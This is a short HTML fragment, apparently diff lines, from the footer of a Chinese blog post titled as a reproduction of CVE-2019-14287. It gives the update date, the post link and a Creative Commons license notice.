+    <p><span class="copy-title">最后更新:</span>2019-10-15, 23:31:15</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/13cae37e.html" title="CVE-2019-14287复现">http://422926799.github.io/posts/13cae37e.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
